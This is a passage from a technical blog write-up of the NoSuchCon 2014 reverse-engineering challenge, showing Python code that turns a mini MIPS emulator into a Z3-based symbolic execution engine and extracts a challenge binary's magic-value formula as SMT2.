</span><span class='line'>    <span class="n">x</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">gpr</span><span class="p">[</span><span class="n">a0</span><span class="p">]</span> <span class="o">*</span> <span class="bp">self</span><span class="o">.</span><span class="n">gpr</span><span class="p">[</span><span class="n">a1</span><span class="p">]</span>
</span><span class='line'>    <span class="bp">self</span><span class="o">.</span><span class="n">gpr</span><span class="p">[</span><span class="s">&#39;lo&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
</span><span class='line'>    <span class="bp">self</span><span class="o">.</span><span class="n">gpr</span><span class="p">[</span><span class="s">&#39;hi&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_LShR</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>I think this is it really, you can now impress girls with your brand new shiny toy, check this out:</p>

<figure class='code'><figcaption><span>mini_mips_symexec_engine@main</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">):</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;=&#39;</span> <span class="o">*</span> <span class="mi">50</span>
</span><span class='line'>    <span class="n">sym</span> <span class="o">=</span> <span class="n">MiniMipsSymExecEngine</span><span class="p">(</span><span class="s">&#39;donotcare.log&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="c"># DO NOT FORGET TO ENABLE Z3 :)</span>
</span><span class='line'>    <span class="n">sym</span><span class="o">.</span><span class="n">enable_z3</span> <span class="o">=</span> <span class="bp">True</span>
</span><span class='line'>    <span class="n">a</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
</span><span class='line'>    <span class="n">sym</span><span class="o">.</span><span class="n">stack</span><span class="p">[</span><span class="s">&#39;var&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">a</span>
</span><span class='line'>    <span class="n">sym</span><span class="o">.</span><span class="n">stack</span><span class="p">[</span><span class="s">&#39;var2&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span>
</span><span class='line'>    <span class="n">sym</span><span class="o">.</span><span class="n">stack</span><span class="p">[</span><span class="s">&#39;var3&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x31337</span>
</span><span class='line'>    <span class="n">sym</span><span class="o">.</span><span class="n">code</span> <span class="o">=</span> <span class="s">&#39;&#39;&#39;.doare:DEADBEEF                 lw      $v0, 0x318+var($fp)  # Load Word</span>
</span><span class='line'><span class="s">.doare:DEADBEEF                 lw      $v1, 0x318+var2($fp)  # Load Word</span>
</span><span class='line'><span class="s">.doare:DEADBEEF                 subu    $v0, $v1, $v0    #</span>
</span><span class='line'><span class="s">.doare:DEADBEEF                 li      $v1, 0x446F8657  # Load Immediate</span>
</span><span class='line'><span class="s">.doare:DEADBEEF                 multu   $v0, $v1         # Multiply Unsigned</span>
</span><span class='line'><span class="s">.doare:DEADBEEF                 mfhi    $v1              # Move From HI</span>
</span><span class='line'><span class="s">.doare:DEADBEEF                 subu    $v0, $v1         # Subtract Unsigned&#39;&#39;&#39;</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">sym</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;Symbolic mode:&#39;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;Resulting equation: </span><span class="si">%r</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">sym</span><span class="o">.</span><span class="n">gpr</span><span class="p">[</span><span class="s">&#39;v0&#39;</span><span class="p">]</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;Resulting value if `a` is 0xdeadb44: </span><span class="si">%#.8x</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">substitute</span><span class="p">(</span>
</span><span class='line'>        <span class="n">sym</span><span class="o">.</span><span class="n">gpr</span><span class="p">[</span><span class="s">&#39;v0&#39;</span><span class="p">],</span> <span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="mh">0xdeadb44</span><span class="p">,</span> <span class="mi">32</span><span class="p">))</span>
</span><span class='line'>    <span class="p">)</span><span class="o">.</span><span class="n">as_long</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;=&#39;</span> <span class="o">*</span> <span class="mi">50</span>
</span><span class='line'>    <span class="n">emu</span> <span class="o">=</span> <span class="n">MiniMipsSymExecEngine</span><span class="p">(</span><span class="s">&#39;donotcare.log&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">emu</span><span class="o">.</span><span class="n">stack</span> <span class="o">=</span> <span class="n">sym</span><span class="o">.</span><span class="n">stack</span>
</span><span class='line'>    <span class="n">emu</span><span class="o">.</span><span class="n">stack</span><span class="p">[</span><span class="s">&#39;var&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xdeadb44</span>
</span><span class='line'>    <span class="n">sym</span><span class="o">.</span><span class="n">stack</span><span class="p">[</span><span class="s">&#39;var2&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span>
</span><span class='line'>    <span class="n">sym</span><span class="o">.</span><span class="n">stack</span><span class="p">[</span><span class="s">&#39;var3&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x31337</span>
</span><span class='line'>    <span class="n">emu</span><span class="o">.</span><span class="n">code</span> <span class="o">=</span> <span class="n">sym</span><span class="o">.</span><span class="n">code</span>
</span><span class='line'>    <span class="n">emu</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;Emulator mode:&#39;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;Resulting value when `a` is 0xdeadb44: </span><span class="si">%#.8x</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">emu</span><span class="o">.</span><span class="n">gpr</span><span class="p">[</span><span class="s">&#39;v0&#39;</span><span class="p">]</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;=&#39;</span> <span class="o">*</span> <span class="mi">50</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">1</span>
</span></code></pre></td></tr></table></div></figure>


<p>Which results in:</p>

<figure class='code'><figcaption><span>w00t, emu & symbolic execution works</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>PS D:\Codes\NoSuchCon2014&gt; python .\mini_mips_symexec_engine.py
</span><span class='line'>==================================================
</span><span class='line'>Symbolic mode:
</span><span class='line'>Resulting equation: 3735928559 +
</span><span class='line'>4294967295*a +
</span><span class='line'>4294967295*
</span><span class='line'>Extract(63,
</span><span class='line'>        32,
</span><span class='line'>        1148159575*Concat(0, 3735928559 + 4294967295*a))
</span><span class='line'>Resulting value if `a` is 0xdeadb44: 0x98f42d24
</span><span class='line'>==================================================
</span><span class='line'>Emulator mode:
</span><span class='line'>Resulting value when `a` is 0xdeadb44: 0x98f42d24
</span><span class='line'>==================================================
</span></code></pre></td></tr></table></div></figure>


<p>Of course, I didn&rsquo;t mention a lot of details that still need to be addressed to have something working: simulating data areas, memory layouts, etc. If you are interested in those, you should read the codes in my <a href="https://github.com/0vercl0k/stuffz/tree/master/NoSuchCon2014">NoSuchCon2014 folder</a>.</p>

<h2>Back into the battlefield</h2>

<p>Here comes the important bits!</p>

<h3>Extracting the function that generates the magic value from the son program counter</h3>

<p>All right, the main objective in this part is to extract the formula that generates the first magic value. As we said earlier, this big block can be seen as a function that takes two arguments (or symbolic variables) and generates the <em>magic DWORD</em> in output. The first thing to do is to copy the code somewhere to feed it to our engine ; I decided to stick all the codes I needed into a separate Python file called <em>code.py</em>.</p>

<figure class='code'><figcaption><span>code.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">block_generate_magic_from_pc_son</span> <span class="o">=</span> <span class="s">&#39;&#39;&#39;.text:00400B8C                 lw      $v0, 0x318+pc_son($fp)  # Load Word</span>
</span><span class='line'><span class="s">.text:00400B90                 sw      $v0, 0x318+tmp_pc($fp)  # Store Word</span>
</span><span class='line'><span class="s">.text:00400B94                 la      $v0, loc_400A78  # Load Address</span>
</span><span class='line'><span class="s">.text:00400B9C                 lw      $v1, 0x318+tmp_pc($fp)  # Load Word</span>
</span><span class='line'><span class="s">.text:00400BA0                 subu    $v0, $v1, $v0    # (regs.pc_father - 400A78)</span>
</span><span class='line'><span class="s">.text:00400BA4                 sw      $v0, 0x318+tmp_pc($fp)  # Store Word</span>
</span><span class='line'><span class="s">.text:00400BA8                 lw      $v0, 0x318+var_300($fp)  # Load Word</span>
</span><span class='line'><span class="s">.text:00400BAC                 li      $v1, 0x446F8657  # Load Immediate</span>
</span><span class='line'><span class="s">.text:00400BB4                 multu   $v0, $v1         # Multiply Unsigned</span>
</span><span class='line'><span class="s">.text:00400BB8                 mfhi    $v1              # Move From HI</span>
</span><span class='line'><span class="s">.text:00400BBC                 subu    $v0, $v1         # Subtract Unsigned</span>
</span><span class='line'><span class="s">[...]</span>
</span><span class='line'><span class="s">.text:00401424                 lw      $v0, 0x318+var_2F0($fp)  # Load Word</span>
</span><span class='line'><span class="s">.text:00401428                 nor     $v0, $zero, $v0  # NOR</span>
</span><span class='line'><span class="s">.text:0040142C                 addiu   $v0, 0x20        # Add Immediate Unsigned</span>
</span><span class='line'><span class="s">.text:00401430                 lw      $a0, 0x318+tmp_pc($fp)  # Load Word</span>
</span><span class='line'><span class="s">.text:00401434                 sllv    $v0, $a0, $v0    # Shift Left Logical Variable</span>
</span><span class='line'><span class="s">.text:00401438                 or      $v0, $v1, $v0    # OR</span>
</span><span class='line'><span class="s">.text:0040143C                 sw      $v0, 0x318+tmp_pc($fp)  # Store Word&#39;&#39;&#39;</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then we have to prepare the environment of our engine: the two symbolic variables are stack-variables, so we have to insert them in the context of our virtual environment. The resulting formula is going to be in <em>$v0</em> at the end of the execution ; this the holy grail, the formula we are after.</p>

<figure class='code'><figcaption><span>solve_nsc2014_step1_z3.py@extract_equation_of_function_that_generates_magic_value</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">extract_equation_of_function_that_generates_magic_value</span><span class="p">():</span>
</span><span class='line'>  <span class="sd">&#39;&#39;&#39;Here we do some magic to transform our mini MIPS emulator</span>
</span><span class='line'><span class="sd">  into a symbolic execution engine ; the purpose is to extract</span>
</span><span class='line'><span class="sd">  the formula of the function generating the 32-bits magic value&#39;&#39;&#39;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">x</span> <span class="o">=</span> <span class="n">mini_mips_symexec_engine</span><span class="o">.</span><span class="n">MiniMipsSymExecEngine</span><span class="p">(</span><span class="s">&#39;function_that_generates_magic_value.log&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">x</span><span class="o">.</span><span class="n">debug</span> <span class="o">=</span> <span class="bp">False</span>
</span><span class='line'>  <span class="n">x</span><span class="o">.</span><span class="n">enable_z3</span> <span class="o">=</span> <span class="bp">True</span>
</span><span class='line'>  <span class="n">pc_son</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s">&#39;pc_son&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
</span><span class='line'>  <span class="n">n_break</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s">&#39;n_break&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
</span><span class='line'>  <span class="n">x</span><span class="o">.</span><span class="n">stack</span><span class="p">[</span><span class="s">&#39;pc_son&#39;</span><span class="p">]</span> <span class="o">=</span>  <span class="n">pc_son</span>
</span><span class='line'>  <span class="n">x</span><span class="o">.</span><span class="n">stack</span><span class="p">[</span><span class="s">&#39;var_300&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">n_break</span>
</span><span class='line'>  <span class="n">emu_generate_magic_from_son_pc</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">print_final_state</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
</span><span class='line'>  <span class="n">compute_magic_equation</span> <span class="o">=</span> <span class="n">x</span><span class="o">.</span><span class="n">gpr</span><span class="p">[</span><span class="s">&#39;v0&#39;</span><span class="p">]</span>
</span><span class='line'>  <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s">&#39;formulas&#39;</span><span class="p">,</span> <span class="s">&#39;generate_magic_value_from_pc_son.smt2&#39;</span><span class="p">),</span> <span class="s">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span><span class='line'>    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">to_SMT2</span><span class="p">(</span><span class="n">compute_magic_equation</span><span class="p">,</span> <span class="n">name</span> <span class="o">=</span> <span class="s">&#39;generate_magic_from_pc_son&#39;</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">pc_son</span><span class="p">,</span> <span class="n">n_break</span><span class="p">,</span> <span class="n">simplify</span><span class="p">(</span><span class="n">compute_magic_equation</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>You can now keep in memory the formula &amp; wrap this function in another one so that you can reuse it every time you need it:</p>

<figure class='code'><figcaption><span>solve_nsc2014_step1_z3.py@generate_magic_from_son_pc_using_z3</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">var_magic</span><span class="p">,</span> <span class="n">var_n_break</span><span class="p">,</span> <span class="n">expr_magic</span> <span class="o">=</span> <span class="p">[</span><span class="bp">None</span><span class="p">]</span><span class="o">*</span><span class="mi">3</span>
</span><span class='line'><span class="k">def</span> <span class="nf">generate_magic_from_son_pc_using_z3</span><span class="p">(</span><span class="n">pc_son</span><span class="p">,</span> <span class="n">n_break</span><span class="p">):</span>
</span><span class='line'>  <span class="sd">&#39;&#39;&#39;Generates the 32 bits magic value thanks to the output</span>
</span><span class='line'><span class="sd">  of the symbolic execution engine: run the analysis once, extract</span>
</span><span class='line'><span class="sd">  the complete equation &amp; reuse it as much as you want&#39;&#39;&#39;</span>
</span><span class='line'>  <span class="k">global</span> <span class="n">var_magic</span><span class="p">,</span> <span class="n">var_n_break</span><span class="p">,</span> <span class="n">expr_magic</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">var_magic</span> <span class="ow">is</span> <span class="bp">None</span> <span class="ow">and</span> <span class="n">var_n_break</span> <span class="ow">is</span> <span class="bp">None</span> <span class="ow">and</span> <span class="n">expr_magic</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
</span><span class='line'>    <span class="n">var_magic</span><span class="p">,</span> <span class="n">var_n_break</span><span class="p">,</span> <span class="n">expr_magic</span> <span class="o">=</span> <span class="n">extract_equation_of_function_that_generates_magic_value</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">substitute</span><span class="p">(</span>
</span><span class='line'>    <span class="n">expr_magic</span><span class="p">,</span>
</span><span class='line'>    <span class="p">(</span><span class="n">var_magic</span><span class="p">,</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="n">pc_son</span><span class="p">,</span> <span class="mi">32</span><span class="p">)),</span>
</span><span class='line'>    <span class="p">(</span><span class="n">var_n_break</span><span class="p">,</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="n">n_break</span><span class="p">,</span> <span class="mi">32</span><span class="p">))</span>
</span><span class='line'>  <span class="p">)</span><span class="o">.</span><span class="n">as_long</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>The power of using symbolic variables here lies in the fact that we don&rsquo;t need to run the emulator every single time you need to call this function ; you get once the generic formula and you just have to substitute the symbolic variables by the concrete values you want. This comes for free with our code, so let&rsquo;s use it heh :&ndash;).</p>

<figure class='code'><figcaption><span>resulting formula in SMT2 format</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>; generate_magic_from_pc_son
</span><span class='line'>(declare-fun n_break () (_ BitVec 32))
</span><span class='line'>(declare-fun pc_son () (_ BitVec 32))
</span><span class='line'>(let ((?x14 (bvadd n_break (bvmul (_ bv4294967295 32) ((_ extract 63 32) (bvmul (_ bv1148159575 64) (concat (_ bv0 32) n_break)))))))
</span><span class='line'>(let ((?x21 ((_ extract 63 32) (bvmul (_ bv1148159575 64) (concat (_ bv0 32) n_break)))))
</span><span class='line'>(let ((?x8 (bvadd ?x21 (concat (_ bv0 1) ((_ extract 31 1) ?x14)))))
</span><span class='line'>(let ((?x26 ((_ extract 31 6) ?x8)))
</span><span class='line'>(let ((?x24 (bvadd (_ bv32 32) (concat (_ bv63 6) (bvnot ?x26)))))
</span><span class='line'>(let ((?x27 (concat (_ bv0 6) ?x26)))
</span><span class='line'>(let ((?x42 (bvmul (_ bv4294967295 32) ?x27)))
</span><span class='line'>(let ((?x67 ((_ extract 6 6) ?x8)))
</span><span class='line'>(let ((?x120 ((_ extract 7 6) ?x8)))
</span><span class='line'>(let ((?x38 (concat (bvadd (_ bv30088 15) ((_ extract 14 0) pc_son)) ((_ extract 31 15) (bvadd (_ bv4290770312 32) pc_son)))))
</span><span class='line'>(let ((?x41 (bvxor (bvadd (bvor (bvlshr ?x38 (bvadd (_ bv1 32) ?x27)) (bvshl ?x38 ?x24)) ?x42) ?x27)))
</span><span class='line'>(let ((?x63 (bvor ((_ extract 0 0) (bvlshr ?x38 (bvadd (_ bv1 32) ?x27))) ((_ extract 0 0) (bvshl ?x38 ?x24)))))
</span><span class='line'>(let ((?x56 (concat (bvadd (_ bv1 1) (bvxor (bvadd ?x63 ?x67) ?x67)) ((_ extract 31 1) (bvadd (_ bv2142377237 32) ?x41)))))
</span><span class='line'>(let ((?x66 (concat (bvadd ((_ extract 9 1) (bvadd (_ bv2142377237 32) ?x41)) ((_ extract 14 6) ?x8)) ((_ extract 31 31) (bvadd ?x56 ?x27)) ((_ extract 30 9) (bvadd ((_ extract 31 1) (bvadd (_ bv2142377237 32) ?x41)) (concat (_ bv0 5) ?x26))))))
</span><span class='line'>(let ((?x118 (bvor ((_ extract 1 0) (bvshl ?x66 (bvadd (_ bv1 32) ?x27))) ((_ extract 1 0) (bvlshr ?x66 ?x24)))))
</span><span class='line'>(let ((?x122 (bvnot (bvadd ?x118 ?x120))))
</span><span class='line'>(let ((?x45 (bvadd (bvor (bvshl ?x66 (bvadd (_ bv1 32) ?x27)) (bvlshr ?x66 ?x24)) ?x27)))
</span><span class='line'>(let ((?x76 ((_ extract 4 2) ?x45)))
</span><span class='line'>(let ((?x110 (bvnot ((_ extract 5 5) ?x45))))
</span><span class='line'>(let ((?x55 ((_ extract 8 6) ?x45)))
</span><span class='line'>(let ((?x108 (bvnot ((_ extract 10 9) ?x45))))
</span><span class='line'>(let ((?x78 ((_ extract 13 11) ?x45)))
</span><span class='line'>(let ((?x106 (bvnot ((_ extract 14 14) ?x45))))
</span><span class='line'>(let ((?x80 ((_ extract 15 15) ?x45)))
</span><span class='line'>(let ((?x104 (bvnot ((_ extract 16 16) ?x45))))
</span><span class='line'>(let ((?x123 (concat (bvnot ((_ extract 31 29) ?x45)) ((_ extract 28 28) ?x45) (bvnot ((_ extract 27 27) ?x45)) ((_ extract 26 26) ?x45) (bvnot ((_ extract 25 25) ?x45)) ((_ extract 24 24) ?x45) (bvnot ((_ extract 23 21) ?x45)) ((_ extract 20 20) ?x45) (bvnot ((_ extract 19 18) ?x45)) ((_ extract 17 17) ?x45) ?x104 ?x80 ?x106 ?x78 ?x108 ?x55 ?x110 ?x76 ?x122)))
</span><span class='line'>(let ((?x50 (concat (bvnot ((_ extract 30 29) ?x45)) ((_ extract 28 28) ?x45) (bvnot ((_ extract 27 27) ?x45)) ((_ extract 26 26) ?x45) (bvnot ((_ extract 25 25) ?x45)) ((_ extract 24 24) ?x45) (bvnot ((_ extract 23 21) ?x45)) ((_ extract 20 20) ?x45) (bvnot ((_ extract 19 18) ?x45)) ((_ extract 17 17) ?x45) ?x104 ?x80 ?x106 ?x78 ?x108 ?x55 ?x110 ?x76 ?x122)))
</span><span class='line'>(let ((?x91 (bvadd (_ bv1720220585 32) (concat (bvnot (bvadd (_ bv612234822 31) ?x50)) (bvnot ((_ extract 31 31) (bvadd (_ bv612234822 32) ?x123)))) ?x42)))
</span><span class='line'>(let ((?x137 (bvnot (bvadd (_ bv128582 17) (concat ?x104 ?x80 ?x106 ?x78 ?x108 ?x55 ?x110 ?x76 ?x122)))))
</span><span class='line'>(let ((?x146 (bvadd (_ bv31657 18) (concat ?x137 (bvnot ((_ extract 31 31) (bvadd (_ bv612234822 32) ?x123)))) (bvmul (_ bv262143 18) ((_ extract 23 6) ?x8)))))
</span><span class='line'>(let ((?x131 (bvadd (_ bv2800103692 32) (concat ?x146 ((_ extract 31 18) ?x91)))))
</span><span class='line'>(let ((?x140 (concat ((_ extract 18 18) ?x91) ((_ extract 31 31) ?x131) (bvnot ((_ extract 30 30) ?x131)) ((_ extract 29 27) ?x131) (bvnot ((_ extract 26 25) ?x131)) ((_ extract 24 24) ?x131) (bvnot ((_ extract 23 22) ?x131)) ((_ extract 21 21) ?x131) (bvnot ((_ extract 20 20) ?x131)) ((_ extract 19 19) ?x131) (bvnot ((_ extract 18 17) ?x131)) ((_ extract 16 14) ?x131) (bvnot ((_ extract 13 9) ?x131)) ((_ extract 8 8) ?x131) (bvnot ((_ extract 7 6) ?x131)) ((_ extract 5 4) ?x131) (bvnot ((_ extract 3 1) ?x131)))))
</span><span class='line'>(let ((?x176 (bvnot (bvadd (concat ((_ extract 4 4) ?x131) (bvnot ((_ extract 3 1) ?x131))) ((_ extract 9 6) ?x8)))))
</span><span class='line'>(let ((?x177 (bvadd (concat ?x176 (bvnot ((_ extract 31 4) (bvadd ?x140 ?x27)))) ?x42)))
</span><span class='line'>(let ((?x187 (bvadd (bvnot ((_ extract 13 4) (bvadd ?x140 ?x27))) (bvmul (_ bv1023 10) ((_ extract 15 6) ?x8)))))
</span><span class='line'>(let ((?x180 (concat (bvadd ((_ extract 23 10) ?x177) (bvmul (_ bv16383 14) ((_ extract 19 6) ?x8))) ((_ extract 31 14) (bvadd (concat ?x187 ((_ extract 31 10) ?x177)) ?x42)))))
</span><span class='line'>(let ((?x79 (bvadd (bvxor (bvadd ?x180 ?x27) ?x27) ?x42)))
</span><span class='line'>(let ((?x211 (concat (bvadd ((_ extract 17 10) ?x177) (bvmul (_ bv255 8) ((_ extract 13 6) ?x8))) ((_ extract 31 14) (bvadd (concat ?x187 ((_ extract 31 10) ?x177)) ?x42)))))
</span><span class='line'>(let ((?x190 (concat (bvnot (bvadd (bvxor (bvadd ?x211 ?x26) ?x26) (bvmul (_ bv67108863 26) ?x26))) (bvnot ((_ extract 31 26) ?x79)))))
</span><span class='line'>(let ((?x173 (bvadd (bvnot (bvadd (_ bv3113082326 32) ?x190 ?x27)) ?x27)))
</span><span class='line'>(let ((?x174 ((_ extract 9 6) ?x8)))
</span><span class='line'>(let ((?x255 ((_ extract 2 2) (bvadd (bvnot (bvadd (_ bv6 4) (bvnot ((_ extract 29 26) ?x79)) ?x174)) ?x174))))
</span><span class='line'>(let ((?x253 ((_ extract 3 3) (bvadd (bvnot (bvadd (_ bv6 4) (bvnot ((_ extract 29 26) ?x79)) ?x174)) ?x174))))
</span><span class='line'>(let ((?x144 ((_ extract 23 6) ?x8)))
</span><span class='line'>(let ((?x233 ((_ extract 17 6) ?x8)))
